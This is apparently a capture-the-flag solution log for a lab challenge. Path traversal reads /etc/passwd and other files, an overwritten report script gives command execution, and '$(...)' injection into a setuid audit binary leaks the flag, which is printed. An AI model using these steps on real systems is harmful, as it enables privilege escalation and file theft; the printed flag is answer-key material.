@@ -1,1 +1,248 @@
+#1
+
+minishell> read ../../../etc/passwd
+>> Requested document successfully retrieved:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+accountant:x:1010:1010::/home/accountant:/bin/bash
+chinezu:x:9000:999::/home/chinezu:/bin/false
+
+#2
+minishell> read ../../../opt/minishell/audit
+>> Requested document successfully retrieved:
+ _main@GLIBC_2.34startrame_hdr@minishell> 
+
+#3
+minishell> read ../../../etc/hosts
+>> Requested document successfully retrieved:
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::  ip6-localnet
+ff00::  ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.128.0.7      cyberbalance.ltd cyberbalance
+
+#4
+minishell> read ../../../etc/group
+>> Requested document successfully retrieved:
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+accountant:x:1010:
+chinezu:x:999:
+
+#5
+minishell> read ../../../home/accountant/.bashrc
+
+
+#6
+minishell> read ../../../home/accountant/.bashrc
+
+#7
+minishell> read ../../../opt/minishell/minishell
+>> Requested document successfully retrieved:
+ELFainP    %z/ .   H {;   H U H            H E H }    T     N     Commands:    " 14.2.0crtstuff.crncmp@GLIBC_2.2.5__interp minishell> 
+
+#8
+minishell> read ../../../proc/1/cmdline
+>> Requested document successfully retrieved:
+suminishell>
+
+#8
+minishell> read ../../../etc/security/limits.conf
+
+
+#9
+minishell> read ../.bash_history
+>> Requested document successfully retrieved:
+#1751381013
+echo test > /home/accountant/Documents/test
+#1751453796
+/home/accountant/run_report.sh
+#1751477015
+/opt/minishell/minishell
+
+#10
+minishell> read ../run_report.sh
+>> Requested document successfully retrieved:
+#!/bin/bash
+
+AUDIT_PATH="/opt/minishell/audit"
+DOCS_DIR="/home/accountant/Documents"
+REPORT=()
+
+for file in "$DOCS_DIR"/*; do
+        if [[ -f "$file" ]]; then
+                lines=$(wc -l < "$file")
+                words=$(wc -w < "$file")
+                REPORT+=("$file: $lines lines, $words words")
+        fi
+done
+
+if [[ "${#REPORT[@]}" -gt 0 ]]; then
+        printf '%s\n' "${REPORT[@]}"
+        echo "Sending the report to audit..."
+        printf '%s\n' "${REPORT[@]}" | "$AUDIT_PATH" "report-$(date -u +"%Y-%m-%d").txt"
+else
+        echo "No documents found!"
+fi
+
+#11
+minishell> write ../run_report.sh #!/bin/bash -i
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+
+#12
+minishell> write ../run_report.sh ls -la /home/accountant/Documents
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+total 12
+drwxr-xr-x 2 accountant accountant 4096 Nov 29 13:06 .
+drwx------ 3 accountant accountant 4096 Nov 29 13:05 ..
+-rw-rw-r-- 1 accountant accountant    8 Nov 29 13:06 exploit.sh
+
+#13
+minishell> write ../run_report.sh ls -la /home/accountant
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+total 32
+drwx------ 3 accountant accountant 4096 Nov 29 13:05 .
+drwxr-xr-x 1 root       root       4096 Nov 29 13:05 ..
+-rw-r--r-- 1 root       root        136 Nov 29 13:05 .bash_history
+-rw-r--r-- 1 accountant accountant  220 Jul 30 19:28 .bash_logout
+-rw-r--r-- 1 accountant accountant 3526 Jul 30 19:28 .bashrc
+-rw-r--r-- 1 accountant accountant  807 Jul 30 19:28 .profile
+drwxr-xr-x 2 accountant accountant 4096 Nov 29 13:06 Documents
+-rwxr-xr-x 1 accountant accountant   24 Nov 29 13:18 run_report.sh
+
+#14
+minishell> write ../run_report.sh ls -laR /opt/minishell
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+/opt/minishell:
+total 48
+drwxr-xr-x 3 chinezu chinezu  4096 Nov 29 13:05 .
+drwxr-xr-x 1 root    root     4096 Nov 29 13:05 ..
+-rwsr-sr-x 1 chinezu chinezu 16264 Nov 29 13:05 audit
+-rwxr-xr-x 1 chinezu chinezu 16632 Nov 29 13:05 minishell
+drwxr-xr-x 2 chinezu chinezu  4096 Nov 29 13:06 reports
+
+/opt/minishell/reports:
+total 12
+drwxr-xr-x 2 chinezu chinezu 4096 Nov 29 13:06 .
+drwxr-xr-x 3 chinezu chinezu 4096 Nov 29 13:05 ..
+-rw-rw-r-- 1 chinezu chinezu    1 Nov 29 13:06 report-2025-11-29.txt
+
+#15
+minishell> write ../run_report.sh find / -name "*flag*" 2>/dev/null
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+/etc/X11/not_for_your_eyes/zflag.x
+/sys/devices/pnp0/00:00/00:00:0/00:00:0.0/tty/ttyS0/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags     
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags     
+/sys/devices/virtual/net/eth0/flags
+/sys/devices/virtual/net/lo/flags
+/sys/module/scsi_mod/parameters/default_dev_flags
+/proc/sys/kernel/acpi_video_flags
+/proc/sys/net/ipv4/fib_notify_on_flag_change
+/proc/sys/net/ipv6/conf/all/ra_honor_pio_pflag
+/proc/sys/net/ipv6/conf/default/ra_honor_pio_pflag
+/proc/sys/net/ipv6/conf/eth0/ra_honor_pio_pflag
+/proc/sys/net/ipv6/conf/lo/ra_honor_pio_pflag
+/proc/sys/net/ipv6/fib_notify_on_flag_change
+/proc/kpageflags
+/usr/lib/linux/uapi/x86/asm/processor-flags.h
+/usr/share/man/man5/proc_kpageflags.5.gz
+/usr/share/man/man3/fegetexceptflag.3.gz
+/usr/share/man/man3/tcflag_t.3type.gz
+/usr/share/man/man3/fesetexceptflag.3.gz
+/usr/include/linux/kernel-page-flags.h
+/usr/include/linux/tty_flags.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
+/usr/include/x86_64-linux-gnu/bits/ss_flags.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h
+/usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
+/usr/include/x86_64-linux-gnu/bits/waitflags.h
+/usr/include/x86_64-linux-gnu/asm/processor-flags.h
+/usr/include/i386-linux-gnu/asm/processor-flags.h
+/usr/include/x86_64-linux-gnux32/asm/processor-flags.h
+
+#16
+minishell> write ../run_report.sh ls -la /etc/X11/not_for_your_eyes/zflag.x; cat /etc/X11/not_for_your_eyes/zflag.x
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+----rwx---+ 1 root root 45 Nov 29 13:25 /etc/X11/not_for_your_eyes/zflag.x       
+cat: /etc/X11/not_for_your_eyes/zflag.x: Permission denied
+
+#17 - Comanda Finala
+minishell> write ../run_report.sh echo "A" | /opt/minishell/audit '$(cd ..;cd ..;cd ..;cd etc;cd X11;cd not_for_your_eyes;cat zflag.x)'
+>> Document successfully saved!
+minishell> report
+>> Running compliance report...
+Waiting to receive the report...
+Report successfully read (1 bytes)
+Report submitted successfully:
+ls: cannot access '/opt/minishell/reports/SpeishFlag{BQ0LZQNlMvxftzjslNMdEynj03h6BZCg}': No such file or directory
 
